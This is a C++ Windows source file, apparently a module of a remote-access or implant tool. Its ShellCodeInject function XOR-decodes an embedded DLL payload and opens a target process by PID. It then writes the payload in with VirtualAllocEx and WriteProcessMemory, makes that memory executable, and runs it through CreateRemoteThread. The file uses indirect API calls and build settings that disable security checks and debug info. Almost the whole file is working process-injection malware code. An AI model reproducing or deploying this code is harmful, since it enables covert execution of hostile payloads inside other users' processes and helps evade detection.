#include <iostream>
#include <windows.h>

#include "FuncType.h"

/*
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release
* 2.C/C++
* 常规: SDL检查(否)
* 优化: 优化(已禁用)
* 代码生成: 运行库(多线程)、安全检查(禁用安全检查)
* 3.链接器
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
*/

using namespace std;

#pragma code_seg(".inject")

// ShellCode 注入
void ShellCodeInject(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    *pOutputData = (char*)((pMalloc)(pFuncAddr[0]))(10);
    **pOutputData = '0';
    *(*pOutputData + 1) = 'f';
    *(*pOutputData + 2) = 'a';
    *(*pOutputData + 3) = 'i';
    *(*pOutputData + 4) = 'l';
    *(*pOutputData + 5) = 'e';
    *(*pOutputData + 6) = 'd';
    *pOutputDataLength = 7;

    RefDllInfo refDllInfo = *((RefDllInfo*)pFuncAddr[27]);
    for (int i = 0; i < 1024; i++) {
        *(refDllInfo.jmpAddr + i) ^= refDllInfo.dllXor;
    }

    char* endPtr;
    int pid = ((pStrtol)pFuncAddr[4])(commandPara, &endPtr, 10);
    HANDLE hProcess = ((pOpenProcess)pFuncAddr[28])(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        **pOutputData = '1';
        return;
    }
    PVOID shellcode = ((pVirtualAllocEx)pFuncAddr[29])(hProcess, NULL, refDllInfo.dllSize, MEM_COMMIT, PAGE_READWRITE);
    if (shellcode == NULL) {
        **pOutputData = '2';
        return;
    }
    if (!((pWriteProcessMemory)pFuncAddr[31])(hProcess, shellcode, refDllInfo.jmpAddr, refDllInfo.dllSize, NULL)) {
        **pOutputData = '3';
        return;
    }
    DWORD oldProtect;
    if (!((pVirtualProtectEx)pFuncAddr[30])(hProcess, shellcode, refDllInfo.dllSize, PAGE_EXECUTE_READ, &oldProtect)) {
        **pOutputData = '4';
        return;
    }
    if (((pCreateRemoteThread)pFuncAddr[32])(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellcode, shellcode, 0, NULL) == NULL) {
        **pOutputData = '6';
        return;
    }

    for (int i = 0; i < 1024; i++) {
        *(refDllInfo.jmpAddr + i) ^= refDllInfo.dllXor;
    }

    **pOutputData = 's';
    *(*pOutputData + 1) = 'u';
    *(*pOutputData + 2) = 'c';
    *(*pOutputData + 3) = 'c';
    *(*pOutputData + 4) = 'e';
    *(*pOutputData + 5) = 's';
    *(*pOutputData + 6) = 's';
    *pOutputDataLength = 7;
}

#pragma code_seg(".text")

int main() {
    RefDllInfo refDllInfo;
    char commandPara[] = "123";
    int commandParaLength = strlen(commandPara) + 1;
    char* outputData;
    int outputDataLength;
    PVOID funcAddr[] = { malloc, realloc, free, strlen, strtol, ((errno_t(*)(char*, rsize_t, const char*))strcpy_s), ((int(*)(char*, size_t, const char*, ...))sprintf_s), CloseHandle, CreateProcessA, CreatePipe, ReadFile, FindFirstFileA, FindNextFileA, FindClose, GetFullPathNameA, FileTimeToLocalFileTime, FileTimeToSystemTime, strtoull, fopen_s, _fseeki64, fread, fwrite, fclose, CopyFileA, rename, ((int(*)(const char*))remove), CreateDirectoryA, &refDllInfo, OpenProcess, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory, CreateRemoteThread };
    ShellCodeInject(commandPara, commandParaLength, &outputData, &outputDataLength, funcAddr);
}
